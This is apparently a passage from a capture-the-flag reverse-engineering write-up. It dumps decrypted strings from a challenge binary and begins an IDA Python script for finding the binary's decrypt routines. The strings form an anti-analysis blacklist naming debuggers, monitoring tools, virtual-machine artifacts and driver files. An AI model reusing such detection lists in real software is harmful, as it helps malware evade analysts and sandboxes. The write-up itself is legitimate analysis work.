class="line">308</span><br><span class="line">309</span><br></pre></td><td class="code"><pre><span class="line">0x140001137 -&gt; \x2ea\x1d\x22\x2c\x1c\x25\x28\x2c\x1e\x1d</span><br><span class="line">0x140001711 -&gt; caaccme</span><br><span class="line">0x140001a01 -&gt; \x1ca\x40\x48extend\x40\x48rmmetadata\x40\x48txflog\x40</span><br><span class="line">0x140001e21 -&gt; \x2dax\x25og\x27tfs</span><br><span class="line">0x140002151 -&gt; nauser.dat</span><br><span class="line">0x1400041fd -&gt; \x1darectory</span><br><span class="line">0x14000452b -&gt; \x2cambolic\x25ink</span><br><span class="line">0x140004e8b -&gt; \x29aocess</span><br><span class="line">0x1400051ab -&gt; \x2daread</span><br><span class="line">0x1400054cb -&gt; \x29artition</span><br><span class="line">0x1400057fb -&gt; \x2eaer\x1apc\x2beserve</span><br><span class="line">0x140005b5b -&gt; \x22a\x1completion\x2beserve</span><br><span class="line">0x140005eeb -&gt; \x1aativity\x2beference</span><br><span class="line">0x14000626b -&gt; \x29aocess\x2ctate\x1change</span><br><span class="line">0x1400065fb -&gt; \x2daread\x2ctate\x1change</span><br><span class="line">0x14000697b -&gt; \x1cau\x29artition</span><br><span class="line">0x140006ccb -&gt; \x29a\x2cilo\x1context\x29aged</span><br><span class="line">0x14000705b -&gt; \x29a\x2cilo\x1context\x27on\x29aged</span><br><span class="line">0x14000740b -&gt; \x1dabug\x28bject</span><br><span class="line">0x140007a5b -&gt; \x26atant</span><br><span class="line">0x140007d7b -&gt; \x1callback</span><br><span class="line">0x1400080ab -&gt; \x2camaphore</span><br><span class="line">0x1400086eb -&gt; \x22a\x2dimer</span><br><span class="line">0x140008a0b -&gt; \x29aofile</span><br><span class="line">0x140008d2b -&gt; \x24ayed\x1event</span><br><span class="line">0x14000906b -&gt; \x30andow\x2ctation</span><br><span class="line">0x1400093bb -&gt; \x1dasktop</span><br><span class="line">0x1400096db -&gt; \x1camposition</span><br><span class="line">0x140009a1b -&gt; \x2baw\x22nput\x26anager</span><br><span class="line">0x140009d7b -&gt; \x1care\x26essaging</span><br><span class="line">0x14000a0cb -&gt; \x1aativation\x28bject</span><br><span class="line">0x14000a43b -&gt; \x2da\x30orker\x1factory</span><br><span class="line">0x14000a79b -&gt; \x1aaapter</span><br><span class="line">0x14000aabb -&gt; \x1cantroller</span><br><span class="line">0x14000adfb -&gt; \x1davice</span><br><span class="line">0x14000b11b -&gt; \x1daiver</span><br><span class="line">0x14000b43b -&gt; \x22a\x1completion</span><br><span class="line">0x14000b78b -&gt; \x30ait\x1completion\x29acket</span><br><span class="line">0x14000be3b -&gt; \x22a\x2bing</span><br><span class="line">0x14000cd9b -&gt; \x2caction</span><br><span class="line">0x14000d0bb -&gt; \x2cassion</span><br><span class="line">0x14000d6db -&gt; \x2bagistry\x2dransaction</span><br><span class="line">0x14000da6b -&gt; \x1daa\x1adapter</span><br><span class="line">0x14000ddab -&gt; \x1aa\x29\x1c \x29ort</span><br><span class="line">0x14000e0db -&gt; \x1eaergy\x2dracker</span><br><span class="line">0x14000e42b -&gt; \x29awer\x2bequest</span><br><span class="line">0x14000e77b -&gt; \x30ai\x20uid</span><br><span class="line">0x14000ea9b -&gt; \x1eaw\x2begistration</span><br><span class="line">0x14000edfb -&gt; \x1eaw\x2cession\x1demux\x1entry</span><br><span class="line">0x14000f19b -&gt; \x1eaw\x1consumer</span><br><span class="line">0x14000f4db -&gt; \x1caverage\x2campler</span><br><span class="line">0x14000f83b -&gt; \x29aw\x28bject</span><br><span class="line">0x14000fb6b -&gt; \x1falter\x1connection\x29ort</span><br><span class="line">0x14000ff0b -&gt; \x1falter\x1communication\x29ort</span><br><span class="line">0x1400102cb -&gt; \x27ais\x1cm\x2ctate</span><br><span class="line">0x14001060b -&gt; \x1dagk\x2chared\x2besource</span><br><span class="line">0x14001099b -&gt; \x1dagk\x2chared\x24eyed\x26utex\x28bject</span><br><span class="line">0x140010d7b -&gt; \x1dagk\x2chared\x2cync\x28bject</span><br><span class="line">0x14001111b -&gt; \x1dagk\x2chared\x2cwap\x1chain\x28bject</span><br><span class="line">0x1400114eb -&gt; \x1dagk\x1display\x26anager\x28bject</span><br><span class="line">0x1400118bb -&gt; \x1dagk\x2chared\x29rotected\x2cession\x28bject</span><br><span class="line">0x140011cdb -&gt; \x1dagk\x2chared\x1bundle\x28bject</span><br><span class="line">0x14001208b -&gt; \x1dagk\x1composition\x28bject</span><br><span class="line">0x14001242d -&gt; \x2faeg\x1configuration\x1context</span><br><span class="line">0x140019e9e -&gt; \x2fa\x30\x1a\x2b\x1e</span><br><span class="line">0x14001a70f -&gt; \x2fa\x2d\x2e\x1a\x25</span><br><span class="line">0x14001f787 -&gt; \x2faox\x26ini\x2bdr\x1d\x27</span><br><span class="line">0x14001fadf -&gt; \x2faox\x26ini\x2bd\x1d\x27</span><br><span class="line">0x14001fe1f -&gt; \x2faox\x2dray\x22\x29\x1c</span><br><span class="line">0x14002045f -&gt; \x2fa\x20eneration\x1counter</span><br><span class="line">0x1400207ef -&gt; \x1darace</span><br><span class="line">0x140020aff -&gt; \x2fa\x1c\x22\x20uest\x1dev</span><br><span class="line">0x14002197c -&gt; \x24a\x26\x24\x2f\x26\x24\x2f\x26   </span><br><span class="line">0x140021c8f -&gt; \x26acrosoft \x21v</span><br><span class="line">0x140021f8f -&gt; \x2faware\x2f\x26ware</span><br><span class="line">0x14002228f -&gt; \x31an\x2f\x26\x26\x31en\x2f\x26\x26</span><br><span class="line">0x14002258f -&gt; pal hyperv  </span><br><span class="line">0x14002288f -&gt; \x2faox\x2fbox\x2fbox</span><br><span class="line">0x1400238b6 -&gt; tapview.exe</span><br><span class="line">0x140023bff -&gt; darace.exe</span><br><span class="line">0x140023f2f -&gt; \x1faddler \x1everywhere.exe</span><br><span class="line">0x1400242df -&gt; \x1faddler.\x30eb\x2ei.exe</span><br><span class="line">0x14002464f -&gt; \x30areshark.exe</span><br><span class="line">0x14002499f -&gt; damppcap.exe</span><br><span class="line">0x140024cdf -&gt; \x2cayllax\x3a\x38.exe</span><br><span class="line">0x14002502f -&gt; wandbg.exe</span><br><span class="line">0x14002535f -&gt; \x1dag\x31.\x2chell.exe</span><br><span class="line">0x1400256af -&gt; iaa\x3a\x38.exe</span><br><span class="line">0x1400259df -&gt; iaa.exe</span><br><span class="line">0x140025cff -&gt; iaaq.exe</span><br><span class="line">0x14002601f -&gt; \x2ba\x1class\x1ex.exe</span><br><span class="line">0x14002636f -&gt; \x2ba\x1class\x1ex\x3a\x38.exe</span><br><span class="line">0x1400266cf -&gt; \x2ba\x1class.\x27\x1e\x2d.exe</span><br><span class="line">0x140026a2f -&gt; \x24aump.exe</span><br><span class="line">0x140026d5f -&gt; \x24aump\x3a\x38.exe</span><br><span class="line">0x14002709f -&gt; \x1dabug\x2fiew.exe</span><br><span class="line">0x1400273ef -&gt; \x2cas\x1exp.exe</span><br><span class="line">0x14002771f -&gt; \x30an\x2cpy.exe</span><br><span class="line">0x140027a4f -&gt; \x29aoc\x1exp\x31.exe</span><br><span class="line">0x140027d8f -&gt; \x29aoc\x26on\x31.exe</span><br><span class="line">0x1400280cf -&gt; \x30andow\x2ditle\x1ex.exe</span><br><span class="line">0x14002843f -&gt; \x1daiver\x26on.exe</span><br><span class="line">0x14002878f -&gt; \x1ea\x30\x1explorer.exe</span><br><span class="line">0x140028aef -&gt; \x29aol\x26on\x31v\x36.exe</span><br><span class="line">0x140028e3f -&gt; \x29arf\x26on\x31.exe</span><br><span class="line">0x14002917f -&gt; \x24arnel\x28bject\x2fiew.exe</span><br><span class="line">0x14002950f -&gt; \x28aj\x1dir.exe</span><br><span class="line">0x14002983f -&gt; \x28aj\x1exp.exe</span><br><span class="line">0x140029b6f -&gt; \x1dagview.exe</span><br><span class="line">0x140029eaf -&gt; dagview\x3a\x38.exe</span><br><span class="line">0x14002a1ff -&gt; natmyfault.exe</span><br><span class="line">0x14002a54f -&gt; natmyfault\x3a\x38.exe</span><br><span class="line">0x14002a8bf -&gt; paocexp.exe</span><br><span class="line">0x14002abff -&gt; \x29aocmon.exe</span><br><span class="line">0x14002af3f -&gt; paocdump.exe</span><br><span class="line">0x14002b27f -&gt; pasuspend.exe</span><br><span class="line">0x14002b5cf -&gt; pasuspend\x3a\x38.exe</span><br><span class="line">0x14002b92f -&gt; tapview\x3a\x38.exe</span><br><span class="line">0x14002bc7f -&gt; vamap.exe</span><br><span class="line">0x14002bfaf -&gt; vamap\x3a\x38.exe</span><br><span class="line">0x14002c2ef -&gt; \x30anobj.exe</span><br><span class="line">0x14002c61f -&gt; \x30anobj\x3a\x38.exe</span><br><span class="line">0x14002c95f -&gt; xa\x38dbg.exe</span><br><span class="line">0x14002cc8f -&gt; xa\x36dbg.exe</span><br><span class="line">0x14002cfbf -&gt; xa\x3adbg.exe</span><br><span class="line">0x14002d2ef -&gt; caeatengine\x46x\x3c\x3a\x45\x3a\x38.exe</span><br><span class="line">0x14002d69f -&gt; \x29aocess\x21acker.exe</span><br><span class="line">0x14002da0f -&gt; \x2castem\x22nformer.exe</span><br><span class="line">0x14002dd8f -&gt; lardpe.exe</span><br><span class="line">0x14002e0bf -&gt; ragmon.exe</span><br><span class="line">0x14002e3ef -&gt; haokexplorer.exe</span><br><span class="line">0x14002e75f -&gt; rass.exe</span><br><span class="line">0x14002ea7f -&gt; patools.exe</span><br><span class="line">0x14002edbf -&gt; iamunitydebugger.exe</span><br><span class="line">0x14002fc8c -&gt; \x2castem \x22nformer</span><br><span class="line">0x14002ffff -&gt; \x30ansider</span><br><span class="line">0x14003031f -&gt; \x2casinternals</span><br><span class="line">0x14003065f -&gt; \x26ark \x2bussinovich</span><br><span class="line">0x1400309cf -&gt; \x1caeat \x1engine</span><br><span class="line">0x140030d0f -&gt; \x29aocess \x21acker</span><br><span class="line">0x14003105f -&gt; \x1basmarck</span><br><span class="line">0x14003137f -&gt; \x30areshark</span><br><span class="line">0x1400316af -&gt; \x21ax\x46\x2bays \x2c\x1a</span><br><span class="line">0x1400319ef -&gt; \x2dae \x22nteractive \x1disassembler</span><br><span class="line">0x140031ddf -&gt; xa\x38dbg</span><br><span class="line">0x1400320ef -&gt; \x1faddler \x1everywhere</span><br><span class="line">0x14003246f -&gt; \x27ar \x2cofer</span><br><span class="line">0x14003279f -&gt; \x1fale\x1activity\x30atch</span><br><span class="line">0x140032b0f -&gt; \x2baclass.\x27\x1e\x2d</span><br><span class="line">0x140032e4f -&gt; \x24a\x38\x1c\x24\x37\x2b</span><br><span class="line">0x140033cb3 -&gt; \x2baclass</span><br><span class="line">0x140033fa6 -&gt; \x2baclass.\x27\x1e\x2d</span><br><span class="line">0x14003431b -&gt; \x2baclass</span><br><span class="line">0x140034606 -&gt; gat\x45\x2ccan\x1copy\x28n\x30rite\x26emory</span><br><span class="line">0x140034a0e -&gt; \x2castem\x22nformer</span><br><span class="line">0x140034d36 -&gt; \x2castem\x22nformer</span><br><span class="line">0x1400350be -&gt; \x1caeat \x1engine</span><br><span class="line">0x1400353d6 -&gt; caeatengine</span><br><span class="line">0x14003574e -&gt; \x1caeat \x1engine</span><br><span class="line">0x140035a66 -&gt; \x1caeat\x1engine</span><br><span class="line">0x140035dde -&gt; xa\x38dbg</span><br><span class="line">0x1400360c6 -&gt; xa\x38dbg\x45exe.pdb</span><br><span class="line">0x14003644e -&gt; xa\x38dbg</span><br><span class="line">0x140036736 -&gt; xa\x38dbg</span><br><span class="line">0x140036a7e -&gt; xa\x38dbg</span><br><span class="line">0x140036d66 -&gt; \x1dancan \x28gilvie</span><br><span class="line">0x1400370ee -&gt; \x2casinternals \x2dool</span><br><span class="line">0x140037436 -&gt; \x2casinternals</span><br><span class="line">0x1400377ae -&gt; \x29aocess \x26onitor</span><br><span class="line">0x140037ae6 -&gt; \x29aoc\x26on\x1driver.pdb</span><br><span class="line">0x140037e8e -&gt; \x2castem\x22nformer</span><br><span class="line">0x1400381b6 -&gt; \x29aocess\x21acker</span><br><span class="line">0x14003853e -&gt; \x2caylla</span><br><span class="line">0x140038826 -&gt; .a\x1a\x2f\x49\x48\x1c\x1dialog\x22mpl\x58\x2f\x29ick\x1dll\x20ui\x58\x58\x2f\x1c\x30indow\x58\x1a\x2d\x25\x58\x58\x58\x1a\x2d\x25\x58\x58</span><br><span class="line">0x140038d4e -&gt; \x26amory \x22ntrospection \x2dool</span><br><span class="line">0x1400390f6 -&gt; \x26a\x1c\x2b\x28\x2c\x28\x1f\x2d \x1d\x1e\x1b\x2e\x20\x20\x22\x27\x20 \x2c\x32\x26\x1b\x28\x25\x2c \x1a\x27\x1d \x1e\x31\x1e\x1c\x2e\x2d\x1a\x1b\x25\x1e\x2c</span><br><span class="line">0x1400395be -&gt; \x30areshark</span><br><span class="line">0x1400398b6 -&gt; ragister\x45tap\x45listener</span><br><span class="line">0x140039c83 -&gt; \x30areshark</span><br><span class="line">0x140039f78 -&gt; wareshark</span><br><span class="line">0x14003ece3 -&gt; darace.sys</span><br><span class="line">0x14003efef -&gt; \x29a\x28\x1c\x26\x28\x27\x36\x37.\x2c\x32\x2c</span><br><span class="line">0x14003f2ff -&gt; \x21aper\x29latform.sys</span><br><span class="line">0x14003f62f -&gt; \x1aaw\x2fmm.sys</span><br><span class="line">0x14003f91f -&gt; karocesshacker.sys</span><br><span class="line">0x14003fc5f -&gt; \x1ea\x28\x3a\x38.sys</span><br><span class="line">0x14003ff4f -&gt; \x1aa\x2c\x33\x22\x28\x3a\x38.sys</span><br><span class="line">0x14004024f -&gt; \x1ba\x45\x1flash\x3a\x38.sys</span><br><span class="line">0x14004055f -&gt; \x1ba\x45\x22\x36c\x3a\x38.sys</span><br><span class="line">0x14004085f -&gt; \x1ba\x26\x1e\x26x\x3a\x38.sys</span><br><span class="line">0x140040b5f -&gt; \x1ba\x26\x22\x31\x29\x3a\x38.sys</span><br><span class="line">0x140040e5f -&gt; \x1capcom.sys</span><br><span class="line">0x14004114f -&gt; cauz\x35\x38\x35.sys</span><br><span class="line">0x14004144f -&gt; \x30an\x2bing\x45\x34x\x3a\x38.sys</span><br><span class="line">0x14004177f -&gt; \x1fairplay\x24\x1d.sys</span><br><span class="line">0x140041a8f -&gt; paldqpoc.sys</span><br><span class="line">0x140041d8f -&gt; \x21a\x28s\x36\x1ec\x35\x34x\x3a\x38.sys</span><br><span class="line">0x1400420bf -&gt; \x29aymemx\x3a\x38.sys</span><br><span class="line">0x1400423cf -&gt; \x26anitor\x45win\x35\x34x\x3a\x38.sys</span><br><span class="line">0x14004272f -&gt; daiver.sys</span><br><span class="line">0x140042a1f -&gt; laa.sys</span><br><span class="line">0x140042cff -&gt; padsrvc\x45x\x3a\x38.pkms</span><br><span class="line">0x14004302f -&gt; kapocesshacker.sys</span><br><span class="line">0x14004336f -&gt; \x21ai\x27\x1f\x28\x3a\x38\x1a.\x2c\x32\x2c</span><br><span class="line">0x14004367f -&gt; magdrvamd\x3a\x38.sys</span><br><span class="line">0x14004399f -&gt; zam\x3a\x38.sys</span><br><span class="line">0x140043c8f -&gt; kaif.sys</span><br><span class="line">0x140043f6f -&gt; \x1aa\x2ep\x22\x28\x3a\x38.sys</span><br><span class="line">0x14004426f -&gt; \x1aar\x1drv\x35\x34.sys</span><br><span class="line">0x14004456f -&gt; \x1aar\x1drv\x35\x34\x35.sys</span><br><span class="line">0x14004487f -&gt; \x1aar\x1drv\x35\x34\x36.sys</span><br><span class="line">0x140044b8f -&gt; \x1aar\x1drv\x35\x34\x37.sys</span><br><span class="line">0x140044e9f -&gt; \x1ba\x26\x22x\x3a\x38.sys</span><br><span class="line">0x14004519f -&gt; \x1ba\x45\x1flash\x3a\x38.sys</span><br><span class="line">0x1400454af -&gt; \x1ba\x45\x21\x30\x26\x22\x28\x3a\x38\x45\x30\x35\x34.sys</span><br><span class="line">0x1400457ef -&gt; \x1ba\x45\x21\x30\x26\x22o\x3a\x38.sys</span><br><span class="line">0x140045aff -&gt; \x1ba\x45\x22\x36c\x3a\x38.sys</span><br><span class="line">0x140045dff -&gt; \x20a\x1c\x22\x1drv\x3a\x38.sys</span><br><span class="line">0x14004610f -&gt; \x21a\x28s\x36\x1ec\x35\x34x\x3a\x38.sys</span><br><span class="line">0x14004643f -&gt; \x21a\x28s\x36\x1ec\x3bx\x3a\x38.sys</span><br><span class="line">0x14004675f -&gt; \x27a\x22\x28\x25ib\x45\x31\x3a\x38.sys</span><br><span class="line">0x140046a7f -&gt; \x27a\x21\x20\x1b\x22\x28\x2c\x36x\x3a\x38.sys</span><br><span class="line">0x140046daf -&gt; \x29alash\x27\x2d.sys</span><br><span class="line">0x1400470af -&gt; \x29aymemx\x3a\x38.sys</span><br><span class="line">0x1400473bf -&gt; \x2ea\x28\x2b\x1e\x30\x3a\x38.\x2c\x32\x2c</span><br><span class="line">0x1400476bf -&gt; \x30an\x1flash\x3a\x38.sys</span><br><span class="line">0x1400479cf -&gt; \x30an\x2bing\x34x\x3a\x38.sys</span><br><span class="line">0x140047cef -&gt; dak\x3a\x38.sys</span><br><span class="line">0x140047fdf -&gt; mac\x1b\x2cv\x3a\x38.sys</span><br><span class="line">0x1400482df -&gt; naflash.sys</span><br><span class="line">0x1400485df -&gt; naflsh\x3a\x38.sys</span><br><span class="line">0x1400488df -&gt; paymem\x3a\x38.sys</span><br><span class="line">0x140048bdf -&gt; rakio\x3a\x38.sys</span><br><span class="line">0x140048edf -&gt; rakiow\x35\x34x\x3a\x38.sys</span><br><span class="line">0x1400491ff -&gt; rakiow\x3cx\x3a\x38.sys</span><br><span class="line">0x14004950f -&gt; sagwindrvx\x3a\x38.sys</span><br><span class="line">0x14004983f -&gt; saperbmc.sys</span><br><span class="line">0x140049b3f -&gt; samav\x3amsr.sys</span><br><span class="line">0x140049e3f -&gt; paddrv\x3a\x38.sys</span><br><span class="line">0x14004a13f -&gt; vaoxnetadp.sys</span><br><span class="line">0x14004a44f -&gt; vaoxusbmon.sys</span><br><span class="line">0x14004a75f -&gt; \x25alla\x26on.sys</span><br><span class="line">0x14004aa4f -&gt; \x29a\x2b\x2d\x26\x2c\x32\x2c.\x2c\x32\x2c</span><br><span class="line">0x14004ad4f -&gt; \x24abj\x1exp.sys</span><br><span class="line">0x14004b03f -&gt; \x29a\x2fiew\x1driver.sys</span><br><span class="line">0x14004b35f -&gt; \x29a\x28\x1c\x26\x28\x27\x36\x38.\x2c\x32\x2c</span><br><span class="line">0x14004b65f -&gt; \x2famouse.sys</span><br><span class="line">0x14004b94f -&gt; \x2faox\x26ouse.sys</span><br><span class="line">0x14004bc4f -&gt; \x2faox\x20uest.sys</span><br><span class="line">0x14004bf4f -&gt; \x2faox\x2c\x1f.sys</span><br><span class="line">0x14004c23f -&gt; \x2faox\x2fideo.sys</span><br><span class="line">0x14004c53f -&gt; vahgfs.sys</span><br><span class="line">0x14004c82f -&gt; vamemctl.sys</span><br><span class="line">0x14004cb2f -&gt; vamouse.sys</span><br><span class="line">0x14004ce1f -&gt; varawdsk.sys</span><br><span class="line">0x14004d11f -&gt; \x32a\x1ark\x1drv\x45d\x2cigned.sys</span><br><span class="line">0x14004d46f -&gt; \x32a\x1ark\x1drv.sys</span><br><span class="line">0x14004d76f -&gt; \x2caie\x2cvc.sys</span><br><span class="line">0x14004da5f -&gt; \x21atp\x1debugger\x2cdk.sys</span><br><span class="line">0x14004dd9f -&gt; dak\x3a\x38.sys</span><br><span class="line">0x14004e07f -&gt; dak\x37\x36.sys</span><br><span class="line">0x14004e35f -&gt; \x2caarp\x28\x1d\x45\x1drv.sys</span><br><span class="line">0x14004f126 -&gt; carss.exe</span><br><span class="line">0x14004f45f -&gt; sachost.exe</span><br><span class="line">0x14004f79f -&gt; laass.exe</span><br><span class="line">0x14004facf -&gt; waninit.exe</span><br><span class="line">0x14004fe0f -&gt; canhost.exe</span><br><span class="line">0x14005014f -&gt; \x2caandard\x1collector.\x2cervice.exe</span><br><span class="line">0x14005054f -&gt; \x28aerwolf\x21elper.exe</span><br><span class="line">0x1400508cf -&gt; \x28aerwolf\x21elper\x3a\x38.exe</span><br><span class="line">0x140050c5f -&gt; saeamwebhelper.exe</span><br><span class="line">0x140050fdf -&gt; \x27a\x1display.\x1container.exe</span><br><span class="line">0x14005139f -&gt; nacontainer.exe</span><br><span class="line">0x1400516ff -&gt; \x27a\x22\x1d\x22\x1a \x2chare.exe</span><br><span class="line">[-] r8/r9 out of range at 0x140051a6f: r8=192, r9=0</span><br><span class="line">0x140051daf -&gt; wanlogon.exe</span><br><span class="line">0x1400520ef -&gt; \x29aesent\x26on\x45x\x3a\x38.exe</span><br><span class="line">0x14005246f -&gt; \x2castem\x2cettings\x1broker.exe</span><br><span class="line">0x14005282f -&gt; \x30ar\x1fault.exe</span><br><span class="line">0x140052b6f -&gt; davenv.exe</span><br><span class="line">0x140052e9f -&gt; \x2fa\x1debug\x1console.exe</span><br><span class="line">0x14005321f -&gt; \x28aen\x1console.exe</span><br><span class="line">0x14005357f -&gt; \x30andows\x2derminal.exe</span><br><span class="line">0x1400ca976 -&gt; \x2da\x2c\x2d\x2c\x22\x20\x27\x22\x27\x20</span><br><span class="line">0x1400cad7e -&gt; \x1da\x2c\x1a\x1b\x25\x1e\x45\x22\x27\x2d\x1e\x20\x2b\x22\x2d\x32\x45\x1c\x21\x1e\x1c\x24\x2c</span><br><span class="line">[-] r8/r9 out of range at 0x1400cb1fe: r8=217, r9=0</span><br><span class="line">[-] r8/r9 out of range at 0x1400cb53c: r8=141, r9=0</span><br><span class="line">0x1400cb8fe -&gt; \x1ba\x2e\x1d\x2b\x1a\x2d\x1e\x50</span><br><span class="line">[-] r8/r9 out of range at 0x1400d2208: r8=198, r9=0</span><br><span class="line">[-] r8/r9 out of range at 0x1400ef860: r8=232, r9=0</span><br><span class="line">0x1400f217e -&gt; \x25agal\x1copyright</span><br><span class="line">0x1400f27ff -&gt; \x40aar\x1file\x22nfo\x40\x2dranslation</span><br><span class="line">0x1400f2cc1 -&gt; \x40atring\x1file\x22nfo\x40</span><br><span class="line">0x1400f3802 -&gt; \x29aoduct\x27ame</span><br><span class="line">0x1400f3e6f -&gt; \x40aar\x1file\x22nfo\x40\x2dranslation</span><br><span class="line">0x1400f4331 -&gt; \x40atring\x1file\x22nfo\x40</span><br><span class="line">0x1400f4e60 -&gt; \x1fale\x1description</span><br><span class="line">0x1400f54f3 -&gt; \x40aar\x1file\x22nfo\x40\x2dranslation</span><br><span class="line">0x1400f59b1 -&gt; \x40atring\x1file\x22nfo\x40</span><br><span class="line">0x1400f6ab8 -&gt; baa\x80bb</span><br><span class="line">0x1400fc827 -&gt; aaocess</span><br><span class="line">0x1400ff19f -&gt; aa\x2f\x1e\x26\x1e\x2d\x21\x1e\x1f\x25\x1a\x20</span><br><span class="line">0x1400ff6c3 -&gt; aa\x28\x4a\x34xbadc\x34\x34d\x39\x4b</span><br><span class="line">0x1400ff9d5 -&gt; aa\x1a\x20 \x1d\x22\x2c\x29\x25\x1a\x32</span><br><span class="line">0x14010350c -&gt; \x41a, youll never recover the flag now.</span><br><span class="line">[-] r8/r9 out of range at 0x14010456e: r8=241, r9=0</span><br><span class="line">0x140104ad8 -&gt; \x2ca\x1f\x2d\x30\x1a\x2b\x1e\x40\x26icrosoft\x40\x2bemoval\x2dools\x40\x26\x2b\x2d</span><br><span class="line">0x140106a01 -&gt; \x4aa\x53\x4b watchdog did not initialize. tampering likely.</span><br><span class="line">0x140107459 -&gt; waere control and identity align youll find the key to the \x41s.</span><br></pre></td></tr></table></figure>

<p>From these strings we can see a huge blacklist that contains many analyze tools and virtual environments. In the main loop also has a line:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">RegOpenKeyExW</span>(HKEY_LOCAL_MACHINE, (LPCWSTR)lpSubKey, <span class="number">0</span>, <span class="number">0x20019u</span>, (PHKEY)&amp;Src.m256_f32[<span class="number">2</span>]) )</span><br></pre></td></tr></table></figure>

<p>This accessed the register of <code>SOFTWARE\\Microsoft\\RemovalTools\\MRT</code>. </p>
<p>Try detect ALL decrypt cipher function:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> ida_funcs</span><br><span class="line"><span class="keyword">import</span> ida_segment</span><br><span class="line"><span class="keyword">import</span> ida_name</span><br><span class="line"><span class="keyword">import</span> ida_kernwin</span><br><span class="line"></span><br><span class="line">MIN_MOV_CHAIN = <span class="number">2</span></span><br><span class="line">MAX_BACK_INSNS = <span class="number">220</span></span><br><span class="line">FUNC_SIZE_MIN = <span class="number">0xF0</span></span><br><span class="line">FUNC_SIZE_MAX = <span class="number">0x110</span></span><br><span class="line"></span><br><span class="line">IGNORED_MNEMS = &#123;</span><br><span class="line">    <span class="string">&quot;vzeroupper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;nop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;int3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;endbr64&quot;</span>,</span><br><span class="line">    <span class="string">&quot;endbr32&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prev_insn</span>(<span class="params">ea</span>):</span><br><span class="line">    p = idc.prev_head(ea)</span><br><span class="line">    <span class="keyword">return</span> p <span class="keyword">if</span> p != idc.BADADDR <span class="keyword">else</span> idc.BADADDR</span><br><span class="line"></span><br><span 